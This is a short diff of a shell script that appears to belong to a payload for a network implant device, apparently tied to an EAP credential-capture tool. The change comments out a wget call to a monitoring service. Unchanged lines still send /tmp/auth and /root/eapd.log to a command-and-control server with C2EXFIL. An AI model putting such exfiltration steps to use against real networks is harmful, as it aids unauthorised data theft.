@@ -46,7 +46,7 @@ start() {
                 printf "EAPD Fail at $(date '+%r on %x')!!! Check Log!\n" >> /tmp/auth	
                 C2EXFIL STRING /tmp/auth FAIL
                 C2EXFIL STRING /root/eapd.log FAIL_LOG
-                wget -q -s "https://cronitor.link/YOUR_AUTHLINK_HERE/fail?auth_key=YOUR_AUTH_KEY_HERE&msg=EAPD"
+                #wget -q -s "https://cronitor.link/YOUR_AUTHLINK_HERE/fail?auth_key=YOUR_AUTH_KEY_HERE&msg=EAPD"
         fi
         printf "|-------------------------------------------END-------------------------------------------|\n" >> /root/eapd.log
 }
